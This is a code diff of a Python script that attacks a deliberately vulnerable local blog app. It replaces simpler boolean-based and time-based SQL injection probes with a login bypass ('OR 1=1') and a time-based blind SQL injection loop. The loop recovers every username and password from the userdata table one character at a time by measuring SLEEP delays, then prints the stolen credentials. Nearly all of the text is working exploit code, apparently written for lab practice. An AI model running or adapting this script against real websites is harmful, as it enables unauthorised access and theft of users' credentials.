@@ -1,49 +1,84 @@
 import requests
-import re
+import string
 from time import time
 
 url = "http://localhost/vuln-blog-web/"
 
-s = requests.Session()
+characters = string.ascii_letters + string.digits + "!@#$%^&*()"
 
-def boolean_based():
-    payload = {"username": "a' OR 1=1 #", "password":""}
-    res = s.post(url+"login.php", data=payload)
+session = requests.Session()
 
-    search = {"search": "asd' OR 1=1 #"}
-    res = s.post(url, data=search)
+payload_login = {"username": "' OR 1=1 #"}
+res = session.post(url+"login.php", data=payload_login)
 
-    creds = re.search(" +class=\"preview-text\">(admin.*)</p>", res.text)
+count = 0
+len_user_i = 0
+j = 0
+len_pw_i = 0
 
-    print("[+] Found admin credentials: " + creds.group(1))
+while True:
+    
+    while True:
 
-def time_based():
+        null_check = {"search": f"coding' AND IF(LENGTH((SELECT username FROM userdata LIMIT {j},1)) IS NULL, SLEEP(2),'a') #"}
+        null_start_time = time()
+        res = session.post(url, data=null_check)
+        null_end_time = time()
+        null_final_time = null_end_time - null_start_time
+        if null_final_time >= 2:
+            count = 1
+            break
 
-    payload = {"username": "' UNION SELECT null,SLEEP(5) #", "password":""}
+        length = {"search": f"coding' AND IF(LENGTH((SELECT username FROM userdata LIMIT {j},1))={len_user_i}, SLEEP(2),'a') #"}
+        start_time = time()
+        res = session.post(url, data=length)
+        end_time = time()
+        final_time = end_time - start_time
+        if final_time >= 2:
+            length = len_user_i
+            len_user_i = 0
+            break
+        len_user_i += 1
 
-    startTime = time()
-    s.post(url+"login.php", data=payload)
-    endTime = time()
-    finalTime = endTime - startTime
+    if count == 1:
+        break
 
-    if finalTime >= 5:
-        print(f'[+] Payload triggered, slept for {finalTime:.2f}s')
-    else:
-        print(f'[-] Payload didn\'t trigger, slept for {finalTime:.2f}s')
+    username = ""
+    for sub_i in range(length+1):
+        for c in characters:
+            payload_search = {"search": f"coding' AND IF(SUBSTRING((SELECT BINARY username FROM userdata LIMIT {j},1),{sub_i},1)='{c}', SLEEP(2),'a') #"}
+            start_time = time()
+            res = session.post(url, data=payload_search)
+            end_time = time()
+            final_time = end_time - start_time
+            if final_time >= 2:
+                username += c
+                break
+    j += 1
 
-def main():
+    while True:
 
-    print('''Choose your mode:\n1. Boolean-based\n2. Time-based''')
+        length = {"search": f"coding' AND IF(LENGTH((SELECT password FROM userdata WHERE username='{username}'))={len_pw_i}, SLEEP(2),'a') #"}
+        start_time = time()
+        res = session.post(url, data=length)
+        end_time = time()
+        final_time = end_time - start_time
+        if final_time >= 2:
+            length_pw = len_pw_i
+            len_pw_i = 0
+            break
+        len_pw_i += 1
+    
+    password = ""
+    for sub_pw_i in range(length_pw+1):
+        for c in characters:
+            payload_search = {"search": f"coding' AND IF(SUBSTRING((SELECT BINARY password FROM userdata WHERE username='{username}'),{sub_pw_i},1)='{c}', SLEEP(2),'a') #"}
+            start_time = time()
+            res = session.post(url, data=payload_search)
+            end_time = time()
+            final_time = end_time - start_time
+            if final_time >= 2:
+                password += c
+                break
 
-    mode = int(input())
-
-    match mode:
-        case 1:
-            boolean_based()
-        case 2:
-            time_based()
-        case _:
-            print("Error mode!")
-
-if __name__ == "__main__":
-    main()
+    print("[+] Found credentials: " + username + ":" + password)
